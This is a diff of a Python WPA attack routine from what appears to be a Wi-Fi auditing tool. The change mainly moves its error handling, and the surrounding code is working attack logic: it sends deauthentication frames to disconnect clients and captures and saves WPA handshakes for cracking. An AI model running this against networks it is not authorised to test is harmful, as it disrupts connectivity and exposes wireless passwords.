@@ -88,8 +88,7 @@ class AttackWPA(Attack):
         '''Returns captured or stored handshake, otherwise None.'''
         handshake = None
 
-        # BIG try-catch to capture ctrl+c
-        try:
+
 
             # First, start Airodump process
             with Airodump(channel=self.target.channel,
@@ -97,106 +96,109 @@ class AttackWPA(Attack):
                           skip_wps=True,
                           output_file_prefix='wpa') as airodump:
 
-                Color.clear_entire_line()
-                Color.pattack('WPA', self.target, 'Handshake capture', 'Waiting for target to appear...')
+                # BIG try-catch to capture ctrl+c
+                try:
 
-
-                self.clients = []
-                airodump_target = self.wait_for_target(airodump)
-
-                # Try to load existing handshake
-                if not Configuration.ignore_old_handshakes:
-                    bssid = airodump_target.bssid
-                    essid = airodump_target.essid if airodump_target.essid_known else None
-                    handshake = self.load_handshake(bssid=bssid, essid=essid)
-                    if handshake:
-                        Color.pattack('WPA', self.target, 'Handshake capture',
-                                      'found {G}existing handshake{W} for {C}%s{W}' % handshake.essid)
-                        Color.pl('\n{+} Using handshake from {C}%s{W}' % handshake.capfile)
-                        return handshake
-
-                timeout_timer = Timer(Configuration.wpa_attack_timeout)
-                deauth_timer = Timer(Configuration.wpa_deauth_timeout)
-
-                while handshake is None and not timeout_timer.ended():
-                    step_timer = Timer(1)
                     Color.clear_entire_line()
-                    Color.pattack('WPA',
-                                  airodump_target,
-                                  'Handshake capture',
-                                  'Listening. (clients:{G}%d{W}, deauth:{O}%s{W}, timeout:{R}%s{W})' % (
-                                  len(self.clients), deauth_timer, timeout_timer))
+                    Color.pattack('WPA', self.target, 'Handshake capture', 'Waiting for target to appear...')
 
-                    # Find .cap file
-                    cap_files = airodump.find_files(endswith='.cap')
-                    if len(cap_files) == 0:
-                        # No cap files yet
-                        time.sleep(step_timer.remaining())
-                        continue
-                    cap_file = cap_files[0]
 
-                    # Copy .cap file to temp for consistency
-                    temp_file = Configuration.temp('handshake.cap.bak')
-                    copy(cap_file, temp_file)
+                    self.clients = []
+                    airodump_target = self.wait_for_target(airodump)
 
-                    # Check cap file in temp for Handshake
-                    bssid = airodump_target.bssid
-                    essid = airodump_target.essid if airodump_target.essid_known else None
-                    handshake = Handshake(temp_file, bssid=bssid, essid=essid)
-                    if handshake.has_handshake():
-                        # We got a handshake
+                    # Try to load existing handshake
+                    if not Configuration.ignore_old_handshakes:
+                        bssid = airodump_target.bssid
+                        essid = airodump_target.essid if airodump_target.essid_known else None
+                        handshake = self.load_handshake(bssid=bssid, essid=essid)
+                        if handshake:
+                            Color.pattack('WPA', self.target, 'Handshake capture',
+                                          'found {G}existing handshake{W} for {C}%s{W}' % handshake.essid)
+                            Color.pl('\n{+} Using handshake from {C}%s{W}' % handshake.capfile)
+                            return handshake
+
+                    timeout_timer = Timer(Configuration.wpa_attack_timeout)
+                    deauth_timer = Timer(Configuration.wpa_deauth_timeout)
+
+                    while handshake is None and not timeout_timer.ended():
+                        step_timer = Timer(1)
                         Color.clear_entire_line()
                         Color.pattack('WPA',
                                       airodump_target,
                                       'Handshake capture',
-                                      '{G}Captured handshake{W}')
-                        Color.pl('')
-                        break
+                                      'Listening. (clients:{G}%d{W}, deauth:{O}%s{W}, timeout:{R}%s{W})' % (
+                                      len(self.clients), deauth_timer, timeout_timer))
 
-                    # There is no handshake
-                    handshake = None
-                    # Delete copied .cap file in temp to save space
-                    os.remove(temp_file)
+                        # Find .cap file
+                        cap_files = airodump.find_files(endswith='.cap')
+                        if len(cap_files) == 0:
+                            # No cap files yet
+                            time.sleep(step_timer.remaining())
+                            continue
+                        cap_file = cap_files[0]
 
-                    # Look for new clients
-                    airodump_target = self.wait_for_target(airodump)
-                    for client in airodump_target.clients:
-                        if client.station not in self.clients:
+                        # Copy .cap file to temp for consistency
+                        temp_file = Configuration.temp('handshake.cap.bak')
+                        copy(cap_file, temp_file)
+
+                        # Check cap file in temp for Handshake
+                        bssid = airodump_target.bssid
+                        essid = airodump_target.essid if airodump_target.essid_known else None
+                        handshake = Handshake(temp_file, bssid=bssid, essid=essid)
+                        if handshake.has_handshake():
+                            # We got a handshake
                             Color.clear_entire_line()
                             Color.pattack('WPA',
                                           airodump_target,
                                           'Handshake capture',
-                                          'Discovered new client: {G}%s{W}' % client.station)
+                                          '{G}Captured handshake{W}')
                             Color.pl('')
-                            self.clients.append(client.station)
+                            break
 
-                    # Send deauth to a client or broadcast
-                    if deauth_timer.ended():
-                        self.deauth(airodump_target)
-                        # Restart timer
-                        deauth_timer = Timer(Configuration.wpa_deauth_timeout)
+                        # There is no handshake
+                        handshake = None
+                        # Delete copied .cap file in temp to save space
+                        os.remove(temp_file)
 
-                    # Sleep for at-most 1 second
-                    time.sleep(step_timer.remaining())
-                    continue  # Handshake listen+deauth loop
+                        # Look for new clients
+                        airodump_target = self.wait_for_target(airodump)
+                        for client in airodump_target.clients:
+                            if client.station not in self.clients:
+                                Color.clear_entire_line()
+                                Color.pattack('WPA',
+                                              airodump_target,
+                                              'Handshake capture',
+                                              'Discovered new client: {G}%s{W}' % client.station)
+                                Color.pl('')
+                                self.clients.append(client.station)
 
-                if handshake is None:
-                    # No handshake, attack failed.
-                    Color.pl('\n{!} {O}WPA handshake capture {R}FAILED:{O} Timed out after %d seconds' % (
-                        Configuration.wpa_attack_timeout))
-                    return handshake
-                else:
-                    # Save copy of handshake to ./hs/
-                    self.save_handshake(handshake)
-                    return handshake
+                        # Send deauth to a client or broadcast
+                        if deauth_timer.ended():
+                            self.deauth(airodump_target)
+                            # Restart timer
+                            deauth_timer = Timer(Configuration.wpa_deauth_timeout)
 
-        except KeyboardInterrupt:
-            Color.pl('\n{!} {O}Interrupted{W}')
-            return None
+                        # Sleep for at-most 1 second
+                        time.sleep(step_timer.remaining())
+                        continue  # Handshake listen+deauth loop
 
-        except Exception as e:
-            Color.pexception(e)
-            return None
+                    if handshake is None:
+                        # No handshake, attack failed.
+                        Color.pl('\n{!} {O}WPA handshake capture {R}FAILED:{O} Timed out after %d seconds' % (
+                            Configuration.wpa_attack_timeout))
+                        return handshake
+                    else:
+                        # Save copy of handshake to ./hs/
+                        self.save_handshake(handshake)
+                        return handshake
+
+                except KeyboardInterrupt:
+                    Color.pl('\n{!} {O}Interrupted{W}')
+                    return None
+
+                except Exception as e:
+                    Color.pexception(e)
+                    return None
 
     def load_handshake(self, bssid, essid):
         if not os.path.exists(Configuration.wpa_handshake_dir):
